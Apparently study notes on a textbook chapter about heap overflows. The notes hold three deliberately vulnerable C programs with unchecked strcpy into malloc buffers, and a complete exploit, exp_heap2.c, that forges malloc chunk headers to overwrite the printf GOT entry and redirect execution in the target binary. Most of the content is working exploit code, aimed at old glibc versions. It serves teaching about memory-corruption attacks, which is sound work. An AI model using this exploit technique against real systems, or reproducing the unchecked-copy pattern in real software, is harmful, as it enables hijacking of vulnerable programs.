
# Chapter 5: Introduction to Heap Overflows.
```
程式碼OK
待解說
```
```
基本Heap Overflows
中階Heap Overflows
Advanced Heap Overflows
```

# 基本Heap Overflows

### notvuln.c
```
/*notvuln.c*/
int  main(int argc, char** argv) {
     char *buf;
  buf=(char*)malloc(1024);
  printf("buf=%p",buf);
  strcpy(buf,argv[1]);
  free(buf);
}
```
### basicheap.c
```
/*basicheap.c*/
int main(int argc, char** argv) {
        char *buf;
        char *buf2;
  buf=(char*)malloc(1024);
  buf2=(char*)malloc(1024);
  printf("buf=%p buf2=%p\n",buf,buf2);
  strcpy(buf,argv[1]);
  free(buf2);
}
```
### heap2.c
```
/*heap2.c ?a vulnerable program that calls malloc() */
int main(int argc, char **argv)
{

 char * buf,*buf2,*buf3;

 buf=(char*)malloc(1024);
 buf2=(char*)malloc(1024);
 buf3=(char*)malloc(1024);
 free(buf2);
 strcpy(buf,argv[1]);
 buf2=(char*)malloc(1024); //this was a free() in the previous example
 printf("Done."); //we will use this to take control in our exploit
}
```

### exp_heap2.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define VULN "./heap2"

#define XLEN 1040 /* 1024 + 16 */
#define ENVPTRZ 512 /* enough to hold our big layout */

/* mov %ecx,0x8(PRINTF_GOT) */
#define PRINTF_GOT 0x08049648 - 8 
/* 13 and 21 work for Mandrake 9, glibc 2.2.5 - you may want to modify these 
  until you point directly at 0x408 (or 0xfffffffc, for certain glibc's). 
  Also, your address must be "clean" meaning not have lower bits set. 0xf0 is clean, 0xf1 is not.
*/
#define CHUNK_ENV_ALLIGN 17 
#define CHUNK_ENV_OFFSET 1056-1024

/* Handy environment loader */
unsigned int
ptoa(char **envp, char *string, unsigned int total_size)
{
  char *p;
  unsigned int cnt;   
  unsigned int size;
  unsigned int i;

  p = string;
  cnt = size = i = 0;
  for (cnt = 0; size < total_size; cnt ++) 
  {
    envp[cnt] = (char *) malloc(strlen(p) + 1);
    envp[cnt] = strdup(p);
#ifdef DEBUG
    fprintf(stderr, "[*] strlen: %d\n", strlen(p) + 1);
    for (i = 0; i < strlen(p) + 1; i ++) fprintf(stderr, "[*] %d: 0x%.02x\n", i, p[i]);
#endif
    size += strlen(p) + 1;
    p += strlen(p) + 1;
  }
  return cnt;
}


int main(int argc, char **argv)
{
  unsigned char *x;
  char *ownenv[ENVPTRZ];
  unsigned int xlen;
  unsigned int i;
  unsigned char chunk[2048 + 1]; 
    /* 2 times 1024 to have enough con-trolled mem to survive the orl */
    
  unsigned char *exe[3];
  unsigned int env_size;
  unsigned long retloc;
  unsigned long retval;
  unsigned int chunk_env_offset;
  unsigned int chunk_env_align;

  xlen = XLEN + (1024 - (XLEN - 1024));
  chunk_env_offset = CHUNK_ENV_OFFSET; 
  chunk_env_align = CHUNK_ENV_ALLIGN;   
  exe[0] = VULN;
  exe[1] = x = malloc(xlen + 1);
  exe[2] = NULL;
  if (!x) exit(-1);
  fprintf(stderr, "\n[*] Options: [ <environment chunk alignment> ] [ <enviroment chunk offset> ]\n\n");
  if (argv[1] && (argc == 2 || argc == 3)) chunk_env_align = atoi(argv[1]); 
  if (argv[2] && argc == 3) chunk_env_offset = atoi(argv[2]); 
  fprintf(stderr, "[*] using align %d and offset %d\n", chunk_env_align, chunk_env_offset);
  retloc = PRINTF_GOT; /* printf GOT - 0x8 ... this is where ecx gets written to, ecx is a chunk ptr */ 
  /*where we want to jump do, if glibc 2.2 ?just anywhere on the stack is good for a demonstration */
  retval=0xbffffd40;
  fprintf(stderr, "[*] Using retloc: %p\n", retloc);
  memset(chunk, 0x00, sizeof(chunk));
  for (i = 0; i < chunk_env_align; i ++) chunk[i] = 'X';
  for (i = chunk_env_align; i <= sizeof(chunk) - (16 + 1); i += (16))
  {
    *(long *)&chunk[i] = 0xfffffffc; 
    *(long *)&chunk[i + 4] = (unsigned long)1032; /* S == chunksize(FD) ... breaking loop (size == 1024 + 8) */ 
    /*retval is not used for 2.3 exploitation...*/
    *(long *)&chunk[i + 8] = retval; 
    *(long *)&chunk[i + 12] = retloc; /* printf GOT - 8..mov %ecx,0x8(%eax) */
  }
#ifdef DEBUG
  for (i = 0; i < sizeof(chunk); i++) fprintf (stderr, "[*] %d: 0x%.02x\n", i, chunk[i]);
#endif
  memset(x, 0xcc, xlen);
  *(long *)&x[XLEN - 16] = 0xfffffffc;
  *(long *)&x[XLEN - 12] = 0xfffffff0;
  /* we point both fd and bk to our fake chunk tag ... so whichever gets used is ok with us */
  /*we subtract 1024 since our buffer is 1024 long and we need to have space for writes after it...
   * you'll see when you trace through this. */
  *(long *)&x[XLEN - 8] = ((0xc0000000 - 4) - strlen(exe[0]) - chunk_env_offset-1024);  
  *(long *)&x[XLEN - 4] = ((0xc0000000 - 4) - strlen(exe[0]) - chunk_env_offset-1024);
  printf("Our fake chunk (0xfffffffc) needs to be at %p\n",((0xc0000000 - 4) - strlen(exe[0]) - chunk_env_offset)-1024);
  /*you could memcpy shellcode into x somewhere, and you would be able to jmp directly 
  /* into it ?otherwise it will just execute whatever is on the stack ?most likely nothing good. (for glibc 2.2) */
  /* clear our enviroment array */
  for (i = 0; i < ENVPTRZ; i++) ownenv[i] = NULL; 
  i = ptoa(ownenv, chunk, sizeof(chunk));
  fprintf(stderr, "[*] Size of enviroment array: %d\n", i);
  fprintf(stderr, "[*] Calling: %s\n\n", exe[0]);
  if (execve(exe[0], (char **)exe, (char **)ownenv)) 
  {
    fprintf(stderr, "Error executing %s\n", exe[0]);
    free(x);
    exit(-1); 
  }
}
```
